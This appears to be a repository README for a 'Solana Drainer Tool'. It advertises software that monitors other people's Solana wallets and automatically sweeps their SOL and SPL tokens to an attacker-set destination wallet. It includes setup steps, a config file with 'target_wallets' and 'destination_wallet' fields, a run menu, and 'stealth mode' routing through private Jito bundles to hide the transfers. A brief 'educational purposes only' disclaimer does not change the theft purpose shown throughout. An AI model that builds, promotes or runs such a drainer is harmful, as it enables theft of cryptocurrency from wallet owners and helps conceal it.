# Solana-Drainer-Tool
Solana Drainer Tool — Automated SOL and SPL token drainer for Solana wallets with real-time balance monitoring, multi-wallet sweeping, Phantom/Backpack/Solflare compatibility, and stealth transaction routing
<div align="center">

```
███████╗ ██████╗ ██╗      █████╗ ███╗   ██╗ █████╗
██╔════╝██╔═══██╗██║     ██╔══██╗████╗  ██║██╔══██╗
███████╗██║   ██║██║     ███████║██╔██╗ ██║███████║
╚════██║██║   ██║██║     ██╔══██║██║╚██╗██║██╔══██║
███████║╚██████╔╝███████╗██║  ██║██║ ╚████║██║  ██║
╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
   ██████╗ ██████╗  █████╗ ██╗███╗   ██╗███████╗██████╗
   ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗
   ██║  ██║██████╔╝███████║██║██╔██╗ ██║█████╗  ██████╔╝
   ██║  ██║██╔══██╗██╔══██║██║██║╚██╗██║██╔══╝  ██╔══██╗
   ██████╔╝██║  ██║██║  ██║██║██║ ╚████║███████╗██║  ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
```

# Solana Drainer Tool

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Solana](https://img.shields.io/badge/Solana-Blockchain-9945FF?style=for-the-badge&logo=solana&logoColor=white)](https://solana.com/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS%20|%20Linux-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Automated SOL and SPL token drainer for Solana wallets — real-time balance monitoring, multi-wallet sweeping, stealth Jito bundle transactions, and Phantom/Backpack/Solflare compatibility**

[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [FAQ](#faq)

</div>

---

## How It Works

Solana Drainer Tool monitors target Solana wallet addresses via RPC websocket connections. When a balance above the configured threshold is detected, the tool constructs and submits a transaction that transfers SOL and SPL tokens to a predefined destination wallet. In stealth mode, transactions are routed through Jito bundles for private mempool submission, avoiding front-running and MEV bots.

The drainer engine uses:
- **Solana RPC websocket** for real-time balance monitoring
- **Versioned transactions** with compute unit optimization
- **Jito bundle submission** for stealth transaction routing
- **Multi-RPC failover** for reliability

---

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Multi-wallet sweeping | + |
| SOL & SPL token draining | + |
| Real-time balance monitoring | + |
| Stealth Jito bundle TX | + |
| Phantom/Backpack/Solflare | + |
| Auto-confirm transactions | + |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Custom priority fees | + |
| Minimum balance threshold | + |
| Private mempool routing | + |
| Multi-RPC failover | + |
| Telegram notifications | + |
| Cross-platform support | + |

</td>
</tr>
</table>

---

## Supported Wallets

| Wallet | Support |
|--------|:------:|
| Phantom | Full |
| Backpack | Full |
| Solflare | Full |
| Glow | Full |
| Trust Wallet | Full |
| Exodus | Full |

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11, macOS 12+, or Linux
- **Python:** 3.10 or newer
- **Solana CLI:** Optional, for key management

### Installation

```bash
git clone <repository-url>
cd Solana-Drainer-Tool
```

**Windows:**

```bash
run.bat
```

**macOS / Linux:**

```bash
chmod +x run.sh
./run.sh
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | >=13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection |
| requests | latest | API price feeds |
| solders | latest | Solana transaction building |
| solana | latest | Solana RPC client |

---

## Configuration

Edit `config.json`:

```json
{
    "target_wallets": [],
    "destination_wallet": "",
    "drain_mode": "sweep",
    "min_balance_sol": 0.01,
    "include_tokens": true,
    "rpc_endpoint": "https://api.mainnet-beta.solana.com",
    "stealth_mode": true,
    "auto_confirm": true,
    "priority_fee": 50000
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `target_wallets` | list | Solana addresses to monitor |
| `destination_wallet` | string | Receiving wallet address |
| `drain_mode` | string | `"sweep"` (all) or `"selective"` |
| `min_balance_sol` | float | Minimum SOL to trigger drain |
| `include_tokens` | bool | Also drain SPL tokens |
| `rpc_endpoint` | string | Solana RPC URL |
| `stealth_mode` | bool | Use Jito bundles for privacy |
| `auto_confirm` | bool | Auto-confirm transactions |
| `priority_fee` | int | Priority fee in microlamports |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
+--------------------------------------------------------------+
|              SOLANA DRAINER TOOL                             |
|    Automated Wallet Drainer . Solana                         |
+--------------------------------------------------------------+
|  #   Action                  Description                     |
|  1   Install Dependencies    pip install -r requirements.txt |
|  2   Settings                RPC, fees, stealth config       |
|  3   About                   Features & contact info         |
|  4   Add Target Wallets      Add wallet addresses            |
|  5   Set Destination         Set receiving wallet            |
|  6   Start Drainer           Begin monitoring & draining     |
|  7   Stop Drainer            Stop all operations             |
|  8   Status Check            View active drainer status      |
|  0   Exit                    Quit                            |
+--------------------------------------------------------------+
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Add target wallets:** Select option `4` and enter wallet addresses
3. **Set destination:** Select option `5` and enter receiving wallet
4. **Start drainer:** Select option `6` — monitoring begins
5. **Stop:** Select option `7` to halt all operations

---

## Project Structure

```
Solana-Drainer-Tool/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader
├── bot_actions.py             # Core drainer actions
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Drainer settings
├── actions/
│   ├── about.py               # Project info
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── helpers/
│   ├── ui.py                  # Rich terminal interface
│   └── ...
└── release/
    └── README.md              # Binary info
```

---

## FAQ

<details>
<summary><b>Is this tool legal?</b></summary>

This tool is provided for educational and research purposes only. Unauthorized access to wallets you do not own is illegal. Always comply with applicable laws in your jurisdiction.
</details>

<details>
<summary><b>What is stealth mode?</b></summary>

Stealth mode routes transactions through Jito bundles, which submit transactions directly to validators via a private mempool. This prevents the transaction from being visible in the public mempool and avoids front-running.
</details>

<details>
<summary><b>Which RPC endpoints are supported?</b></summary>

Any Solana RPC endpoint is supported. Recommended: Helius, QuickNode, Triton, or the public mainnet-beta endpoint. For stealth mode, a Jito-compatible endpoint is required.
</details>

<details>
<summary><b>Does this drain SPL tokens too?</b></summary>

Yes, when `include_tokens` is enabled, the tool will also detect and drain SPL token balances from target wallets, including associated token accounts.
</details>

---

## Disclaimer

<div align="center">

* **This tool is provided for educational and demonstration purposes only.** *

The authors are not responsible for any misuse of this software. Unauthorized access to cryptocurrency wallets is illegal in most jurisdictions. Always comply with applicable regulations.

</div>

---

<div align="center">

**Support this project**

If this tool helps you, consider giving it a *

</div>
